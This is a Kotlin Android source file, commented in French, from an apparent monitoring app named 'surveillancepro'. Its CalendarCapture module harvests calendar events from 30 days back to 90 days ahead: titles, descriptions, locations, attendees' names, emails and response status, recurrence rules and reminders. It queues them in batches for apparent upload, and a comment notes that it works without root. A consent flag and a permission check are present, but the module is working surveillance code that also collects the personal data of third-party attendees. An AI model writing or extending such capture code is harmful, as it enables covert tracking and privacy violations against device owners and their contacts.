package com.surveillancepro.android.services

import android.Manifest
import android.content.ContentResolver
import android.content.Context
import android.content.pm.PackageManager
import android.provider.CalendarContract
import android.util.Log
import androidx.core.content.ContextCompat
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.data.EventQueue
import java.text.SimpleDateFormat
import java.util.Calendar
import java.util.Date
import java.util.Locale

/**
 * Capture des événements du calendrier.
 * 
 * DONNÉES CAPTURÉES:
 * - Titre de l'événement
 * - Description
 * - Lieu
 * - Date/heure de début et fin
 * - Participants
 * - Rappels
 * - Récurrence
 * 
 * SANS ROOT - Utilise ContentResolver standard
 */
object CalendarCapture {
    
    private const val TAG = "CalendarCapture"
    private val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)
    
    /**
     * Capture tous les événements du calendrier (passés et futurs).
     */
    fun captureAllEvents(context: Context, daysBack: Int = 30, daysForward: Int = 90) {
        val storage = DeviceStorage.getInstance(context)
        if (!storage.hasAccepted) return
        
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALENDAR) 
            != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "READ_CALENDAR permission not granted")
            return
        }
        
        val queue = EventQueue.getInstance(context)
        val events = mutableListOf<Map<String, Any?>>()
        
        val resolver = context.contentResolver
        
        // Calculer la plage de dates
        val now = Calendar.getInstance()
        val startTime = Calendar.getInstance().apply {
            add(Calendar.DAY_OF_YEAR, -daysBack)
        }.timeInMillis
        val endTime = Calendar.getInstance().apply {
            add(Calendar.DAY_OF_YEAR, daysForward)
        }.timeInMillis
        
        // Récupérer les calendriers
        val calendars = getCalendars(resolver)
        
        // Récupérer les événements
        val cursor = resolver.query(
            CalendarContract.Events.CONTENT_URI,
            null,
            "${CalendarContract.Events.DTSTART} >= ? AND ${CalendarContract.Events.DTSTART} <= ?",
            arrayOf(startTime.toString(), endTime.toString()),
            "${CalendarContract.Events.DTSTART} ASC"
        )
        
        cursor?.use {
            val idIndex = it.getColumnIndex(CalendarContract.Events._ID)
            val titleIndex = it.getColumnIndex(CalendarContract.Events.TITLE)
            val descIndex = it.getColumnIndex(CalendarContract.Events.DESCRIPTION)
            val locationIndex = it.getColumnIndex(CalendarContract.Events.EVENT_LOCATION)
            val startIndex = it.getColumnIndex(CalendarContract.Events.DTSTART)
            val endIndex = it.getColumnIndex(CalendarContract.Events.DTEND)
            val allDayIndex = it.getColumnIndex(CalendarContract.Events.ALL_DAY)
            val calendarIdIndex = it.getColumnIndex(CalendarContract.Events.CALENDAR_ID)
            val rruleIndex = it.getColumnIndex(CalendarContract.Events.RRULE)
            val organizerIndex = it.getColumnIndex(CalendarContract.Events.ORGANIZER)
            
            while (it.moveToNext()) {
                try {
                    val eventId = it.getLong(idIndex)
                    val title = it.getString(titleIndex) ?: "Sans titre"
                    val description = if (descIndex >= 0) it.getString(descIndex) else null
                    val location = if (locationIndex >= 0) it.getString(locationIndex) else null
                    val startMs = it.getLong(startIndex)
                    val endMs = if (endIndex >= 0) it.getLong(endIndex) else startMs
                    val allDay = if (allDayIndex >= 0) it.getInt(allDayIndex) == 1 else false
                    val calendarId = if (calendarIdIndex >= 0) it.getLong(calendarIdIndex) else 0
                    val rrule = if (rruleIndex >= 0) it.getString(rruleIndex) else null
                    val organizer = if (organizerIndex >= 0) it.getString(organizerIndex) else null
                    
                    // Récupérer les participants
                    val attendees = getAttendees(resolver, eventId)
                    
                    // Récupérer les rappels
                    val reminders = getReminders(resolver, eventId)
                    
                    events.add(mapOf(
                        "id" to eventId,
                        "title" to title,
                        "description" to description,
                        "location" to location,
                        "startTime" to dateFormat.format(Date(startMs)),
                        "endTime" to dateFormat.format(Date(endMs)),
                        "allDay" to allDay,
                        "calendarName" to calendars[calendarId],
                        "isRecurring" to (rrule != null),
                        "recurrenceRule" to rrule,
                        "organizer" to organizer,
                        "attendees" to attendees,
                        "reminders" to reminders,
                        "isPast" to (endMs < now.timeInMillis),
                    ))
                    
                } catch (e: Exception) {
                    Log.w(TAG, "Error reading calendar event: ${e.message}")
                }
            }
        }
        
        // Envoyer par lots
        val batches = events.chunked(30)
        for ((index, batch) in batches.withIndex()) {
            queue.enqueue("calendar_events", mapOf(
                "events" to batch,
                "count" to batch.size,
                "batchIndex" to index,
                "totalBatches" to batches.size,
                "totalEvents" to events.size,
                "daysBack" to daysBack,
                "daysForward" to daysForward,
                "timestamp" to dateFormat.format(Date()),
            ))
        }
        
        Log.d(TAG, "Captured ${events.size} calendar events")
    }
    
    /**
     * Récupère la liste des calendriers.
     */
    private fun getCalendars(resolver: ContentResolver): Map<Long, String> {
        val calendars = mutableMapOf<Long, String>()
        
        val cursor = resolver.query(
            CalendarContract.Calendars.CONTENT_URI,
            arrayOf(CalendarContract.Calendars._ID, CalendarContract.Calendars.CALENDAR_DISPLAY_NAME),
            null,
            null,
            null
        )
        
        cursor?.use {
            val idIndex = it.getColumnIndex(CalendarContract.Calendars._ID)
            val nameIndex = it.getColumnIndex(CalendarContract.Calendars.CALENDAR_DISPLAY_NAME)
            
            while (it.moveToNext()) {
                val id = it.getLong(idIndex)
                val name = it.getString(nameIndex) ?: "Calendrier"
                calendars[id] = name
            }
        }
        
        return calendars
    }
    
    /**
     * Récupère les participants d'un événement.
     */
    private fun getAttendees(resolver: ContentResolver, eventId: Long): List<Map<String, Any>> {
        val attendees = mutableListOf<Map<String, Any>>()
        
        val cursor = resolver.query(
            CalendarContract.Attendees.CONTENT_URI,
            null,
            "${CalendarContract.Attendees.EVENT_ID} = ?",
            arrayOf(eventId.toString()),
            null
        )
        
        cursor?.use {
            val emailIndex = it.getColumnIndex(CalendarContract.Attendees.ATTENDEE_EMAIL)
            val nameIndex = it.getColumnIndex(CalendarContract.Attendees.ATTENDEE_NAME)
            val statusIndex = it.getColumnIndex(CalendarContract.Attendees.ATTENDEE_STATUS)
            
            while (it.moveToNext()) {
                val email = if (emailIndex >= 0) it.getString(emailIndex) else null
                val name = if (nameIndex >= 0) it.getString(nameIndex) else null
                val status = if (statusIndex >= 0) it.getInt(statusIndex) else 0
                
                val statusLabel = when (status) {
                    CalendarContract.Attendees.ATTENDEE_STATUS_ACCEPTED -> "accepted"
                    CalendarContract.Attendees.ATTENDEE_STATUS_DECLINED -> "declined"
                    CalendarContract.Attendees.ATTENDEE_STATUS_TENTATIVE -> "tentative"
                    else -> "pending"
                }
                
                if (email != null || name != null) {
                    attendees.add(mapOf(
                        "email" to (email ?: ""),
                        "name" to (name ?: ""),
                        "status" to statusLabel,
                    ))
                }
            }
        }
        
        return attendees
    }
    
    /**
     * Récupère les rappels d'un événement.
     */
    private fun getReminders(resolver: ContentResolver, eventId: Long): List<Map<String, Any>> {
        val reminders = mutableListOf<Map<String, Any>>()
        
        val cursor = resolver.query(
            CalendarContract.Reminders.CONTENT_URI,
            null,
            "${CalendarContract.Reminders.EVENT_ID} = ?",
            arrayOf(eventId.toString()),
            null
        )
        
        cursor?.use {
            val minutesIndex = it.getColumnIndex(CalendarContract.Reminders.MINUTES)
            val methodIndex = it.getColumnIndex(CalendarContract.Reminders.METHOD)
            
            while (it.moveToNext()) {
                val minutes = if (minutesIndex >= 0) it.getInt(minutesIndex) else 0
                val method = if (methodIndex >= 0) it.getInt(methodIndex) else 0
                
                val methodLabel = when (method) {
                    CalendarContract.Reminders.METHOD_ALERT -> "notification"
                    CalendarContract.Reminders.METHOD_EMAIL -> "email"
                    CalendarContract.Reminders.METHOD_SMS -> "sms"
                    else -> "default"
                }
                
                reminders.add(mapOf(
                    "minutesBefore" to minutes,
                    "method" to methodLabel,
                ))
            }
        }
        
        return reminders
    }
    
    /**
     * Capture les événements à venir (prochaines 24h).
     * Utile pour les alertes.
     */
    fun captureUpcomingEvents(context: Context): List<Map<String, Any?>> {
        val storage = DeviceStorage.getInstance(context)
        if (!storage.hasAccepted) return emptyList()
        
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALENDAR) 
            != PackageManager.PERMISSION_GRANTED) {
            return emptyList()
        }
        
        val events = mutableListOf<Map<String, Any?>>()
        val resolver = context.contentResolver
        
        val now = System.currentTimeMillis()
        val tomorrow = now + 24 * 60 * 60 * 1000
        
        val cursor = resolver.query(
            CalendarContract.Events.CONTENT_URI,
            arrayOf(
                CalendarContract.Events._ID,
                CalendarContract.Events.TITLE,
                CalendarContract.Events.DTSTART,
                CalendarContract.Events.EVENT_LOCATION
            ),
            "${CalendarContract.Events.DTSTART} >= ? AND ${CalendarContract.Events.DTSTART} <= ?",
            arrayOf(now.toString(), tomorrow.toString()),
            "${CalendarContract.Events.DTSTART} ASC"
        )
        
        cursor?.use {
            while (it.moveToNext()) {
                val title = it.getString(1) ?: "Sans titre"
                val startMs = it.getLong(2)
                val location = it.getString(3)
                
                events.add(mapOf(
                    "title" to title,
                    "startTime" to dateFormat.format(Date(startMs)),
                    "location" to location,
                ))
            }
        }
        
        return events
    }
}
